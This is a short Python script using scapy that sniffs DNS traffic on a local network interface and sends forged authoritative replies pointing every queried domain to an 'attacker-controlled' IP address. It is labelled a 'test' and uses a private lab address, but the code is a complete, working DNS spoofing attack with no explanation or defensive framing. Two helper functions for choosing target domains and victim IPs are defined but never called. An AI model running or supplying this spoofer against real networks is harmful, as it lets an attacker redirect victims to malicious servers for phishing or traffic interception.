
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

# Attacker-controlled IP (the fake answer target)
redirect_ip = "192.168.56.103"

# process and respond to DNS queries
def handle_dns_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
        query_name = packet[DNSQR].qname.decode().rstrip('.')
        print(f"[+] Intercepted DNS request for: {query_name}")

        # spoofed DNS response
        spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                      DNS(
                          id=packet[DNS].id,
                          qr=1,
                          aa=1,
                          qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, rdata=redirect_ip)
                      )

        send(spoofed_pkt, verbose=False)
        print(f"[+] Sent spoofed DNS response to {packet[IP].src}")

# test 
if __name__ == "__main__":
    interface = "enp0s3"  # network interface

    print("[*] Starting DNS spoof test. Press CTRL+C to stop.")
    try:
        sniff(
            filter="udp port 53",
            iface=interface,
            prn=handle_dns_packet,
            store=0
        )
    except KeyboardInterrupt:
        print("\n[!] Test stopped.")


# Function to check if the DNS query matches the target domain
def is_target_domain(query_name, target_domains):
    """
    Check if the DNS query matches any domain in the target list.

    query_name: The domain name from the DNS query (str)
    target_domains: List of domains to spoof (list of str)
    """
    if not target_domains:
        return True  # Spoof all domains if list is empty
    return query_name in target_domains

# Function to check if the DNS query comes from a target victim IP
def is_target_victim(src_ip, target_ips):
    """
    Check if the source IP of the DNS query matches any IP in the target list.

    src_ip: The source IP address from the DNS query (str)
    target_ips: List of victim IPs to spoof (list of str)

    """
    if not target_ips:
        return True  # Spoof all victims if list is empty
    return src_ip in target_ips